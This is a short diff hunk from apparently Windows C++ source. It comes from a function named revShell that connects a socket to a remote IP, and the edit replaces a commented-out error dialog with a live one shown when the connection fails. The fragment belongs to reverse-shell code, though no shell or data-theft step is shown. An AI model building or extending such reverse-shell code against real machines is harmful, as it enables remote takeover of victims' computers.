@@ -86,7 +86,7 @@ void revShell(char* ip) {
 
     if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
 
-        //MessageBoxA(NULL, "Failed to connect to the remote host", "Connection Error", MB_OK | MB_ICONERROR);
+        MessageBoxA(NULL, "Server unreachable or offline!", "Connection Error", MB_OK | MB_ICONERROR);
     }
     else {
         string localIP = getLocalIP();
